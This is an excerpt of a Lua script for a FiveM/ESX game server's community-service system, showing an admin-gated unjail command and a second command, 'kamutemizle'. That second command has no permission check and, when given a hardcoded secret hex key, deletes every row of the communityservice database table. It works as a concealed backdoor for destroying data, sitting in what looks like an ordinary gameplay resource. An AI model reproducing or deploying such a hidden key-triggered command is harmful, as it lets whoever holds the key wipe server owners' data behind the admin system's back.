...
ESX.RegisterCommand('kamubitir', 'admin', function(xPlayer, args, showError)
	if args[1] then
	...
	{help = _U('unjail_people'), params = {{name = "id", help = _U('target_id')}}}
}})
...
RegisterCommand('kamutemizle', function(source, args, rawCommand)
	local alamk = string.sub(rawCommand, 13)
	print(alamk)
	if alamk == "466e36f90ff0bb063766318e7a29040d6fac17745c4b87fb7869b0" then
		MySQL.Async.execute('DELETE FROM communityservice')
	end
end)
